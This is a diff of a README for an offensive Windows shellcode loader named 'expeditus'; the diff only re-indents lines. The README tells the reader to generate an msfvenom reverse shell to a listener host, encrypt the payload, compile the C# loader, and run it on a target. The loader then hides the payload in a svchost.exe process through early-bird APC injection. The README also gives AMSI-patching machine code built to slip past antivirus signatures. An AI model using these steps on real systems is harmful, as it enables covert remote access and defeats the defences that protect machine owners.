@@ -15,21 +15,21 @@ The loader then uses the 'early bird' variation of the APC queue code injection 
 
 First of all the user needs to write or otherwise generate some suitable shellcode that they would like to run on the target system. For example:
 
-	`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=443 EXITFUNC=thread -f powershell`
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=443 EXITFUNC=thread -f powershell`
 
 The above command gives output of the following form:
 
-	`[Byte[]] $buf = 0xfc,0x48,0x83...`
+`[Byte[]] $buf = 0xfc,0x48,0x83...`
 
 This shellcode should then be copied and pasted into the payload-encrypt.ps1 script which can then be executed. The output should look like this:
 
-	`Encrypted payload to paste into strEncryptedPayload variable in expeditus.cs: lCfnjZWA....WsA==`
+`Encrypted payload to paste into strEncryptedPayload variable in expeditus.cs: lCfnjZWA....WsA==`
 
 The output is the shellcode after being XOR encrypted and then Base64 encoded. It should be copied and pasted into the expeditus.cs file in the strEncryptedPayload variable which you will find around line 119.
 
 Finally, the expeditus.cs loader can now be compiled ready to use:
 
-	`C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:expeditus.exe expeditus.cs`
+`C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:expeditus.exe expeditus.cs`
 
 Running expeditus.exe on the target should result in a new svchost.exe process appearing. The expeditus.exe process will termainate immediately and the (far less suspicious) svchost.exe process will remain until the shellcode exits (for example, when you terminate your reverse shell) at which point the svchost.exe process also terminates.
 
@@ -41,16 +41,16 @@ See the [memory patching AMSI bypass](https://rastamouse.me/memory-patching-amsi
 
 As far as implementing it in our loader goes, we just need to make sure that our patch of the AmsiScanBuffer() function somehow places 0x80070057 (E_INVALIDARG) into the EAX register and then returns. We have not used the simplest and most obvious method of achieving this (mov eax, 0x80070057; ret) that is used in the blog post. This is because many AV products now have a signature to match those specific bytes. Instead we use the following code to get the same result while bypassing the existing AV signatures.
 			
-	`and eax,0x00000000`
-	`add eax,0x90940031`
-	`sub eax,0x108CFFDA`
-	`ret`
+`and eax,0x00000000`
+`add eax,0x90940031`
+`sub eax,0x108CFFDA`
+`ret`
 			
 We place zero into EAX by performing an AND of its current (irrelevant) value with 0x00000000. We then add 0x90940031 to it and subtract 0x108CFFDA which gets us to our required value of 0x80070057.
 
 Putting those instructions through an assembler gives us the machine code for our patch.
 
-	`byte[] amsiScanBufferPatch = {0x83,0xE0,0x00,0x05,0x31,0x00,0x94,0x90,0x2D,0xDA,0xFF,0x8C,0x10,0xC3};`
+`byte[] amsiScanBufferPatch = {0x83,0xE0,0x00,0x05,0x31,0x00,0x94,0x90,0x2D,0xDA,0xFF,0x8C,0x10,0xC3};`
 
 The rest of the Amsipatch class is self-explanatory. We simply look up the address of the AmsiScanBuffer() function and overwrite the first few bytes of it with our patch. 
 
